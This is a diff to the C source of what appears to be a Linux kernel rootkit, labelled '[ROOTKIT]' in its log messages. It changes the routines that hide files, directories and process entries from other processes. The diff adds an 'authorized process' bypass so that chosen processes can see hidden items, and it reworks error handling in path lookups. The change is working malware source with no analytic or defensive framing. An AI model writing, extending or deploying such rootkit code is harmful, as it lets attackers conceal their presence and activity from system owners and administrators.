@@ -1,5 +1,6 @@
 #include "files.h"
 
+#include "constants.h"
 #include "macro_utils.h"
 #include <asm-generic/errno-base.h>
 #include <asm/current.h>
@@ -55,10 +56,15 @@ bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_nam
     return i32_res == 0;
 }
 
-bool is_dentry_hidden(const dentry_t *const p_dentry)
+bool is_dentry_hidden(const dentry_t *const p_dentry, bool b_check_auth)
 {
     bool b_ret          = false; // Return value
     pid_t i32_found_pid = -1;    // PID of the process found in the path, if any
+
+    if (b_check_auth && is_process_authorized(PID_SELF)) {
+        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        return false;
+    }
 
     IF_U (p_dentry == NULL) {
         return false;
@@ -74,7 +80,8 @@ bool is_dentry_hidden(const dentry_t *const p_dentry)
         pr_info("[ROOTKIT]   * This is not a process file/dir\n");
     }
 
-    IF_U (is_filename_or_pid_hidden(p_dentry->d_name.name, is_dentry_parent_proc_root(p_dentry))) {
+    IF_U (is_filename_or_pid_hidden(p_dentry->d_name.name, is_dentry_parent_proc_root(p_dentry),
+                                    false)) {
         return true;
     }
 
@@ -95,20 +102,23 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
     bool skip_path_check     = false; // Whether to skip the existing path check
     path_t path;                      // Path structure
 
-    ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount
+    IF_U (is_process_authorized(PID_SELF)) {
+        pr_info("[ROOTKIT]   * Process is authorized, bypassing checks...\n");
+        return false;
+    }
 
+    ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount
 
     // First, check without following symlinks
     IF_U (ui32_lookup_flags & LOOKUP_CREATE) {
         p_dentry = user_path_create(i32_dfd, s_pathname, &path, ui32_lookup_flags & ~LOOKUP_FOLLOW);
 
         IF_U (IS_ERR_OR_NULL(p_dentry)) {
-            if (PTR_ERR_OR_ZERO(p_dentry) == -EEXIST) {
+            i32_err = PTR_ERR_OR_ZERO(p_dentry);
+            if (i32_err == -EEXIST) {
                 pr_info("[ROOTKIT]   * File already exists\n");
-                //path_put(&path);
             }
             else {
-                i32_err = PTR_ERR_OR_ZERO(p_dentry);
                 ui32_lookup_flags &= ~LOOKUP_FOLLOW;
                 goto print_err;
             }
@@ -118,7 +128,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                     p_dentry->d_name.name);
             // If we are looking for a parent directory, we need to go up the directory tree
             p_parent = dget_parent(p_dentry); // Lock the parent dentry
-            b_ret    = is_dentry_hidden(p_parent);
+            b_ret    = is_dentry_hidden(p_parent, false);
             dput(p_parent); // Release the parent dentry
             done_path_create(&path, p_dentry);
 
@@ -134,7 +144,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
             goto print_err;
         }
 
-        b_ret = is_path_hidden(&path);
+        b_ret = is_path_hidden(&path, false);
 
         // Free the path structure
         path_put(&path);
@@ -152,12 +162,11 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
         p_dentry = user_path_create(i32_dfd, s_pathname, &path, ui32_lookup_flags);
 
         IF_U (IS_ERR_OR_NULL(p_dentry)) {
-            if (PTR_ERR_OR_ZERO(p_dentry) == -EEXIST) {
+            i32_err = PTR_ERR_OR_ZERO(p_dentry);
+            if (i32_err == -EEXIST) {
                 pr_info("[ROOTKIT]   * File already exists\n");
-                //path_put(&path);
             }
             else {
-                i32_err = PTR_ERR_OR_ZERO(p_dentry);
                 goto print_err;
             }
         }
@@ -165,7 +174,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
             pr_info("[ROOTKIT]   * File does not exist, created dentry: %s\n",
                     p_dentry->d_name.name);
             p_parent = dget_parent(p_dentry);
-            b_ret    = is_dentry_hidden(p_parent);
+            b_ret    = is_dentry_hidden(p_parent, false);
             dput(p_parent);
             done_path_create(&path, p_dentry);
 
@@ -180,7 +189,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
             goto print_err;
         }
 
-        b_ret = is_path_hidden(&path);
+        b_ret = is_path_hidden(&path, false);
         path_put(&path);
     }
 
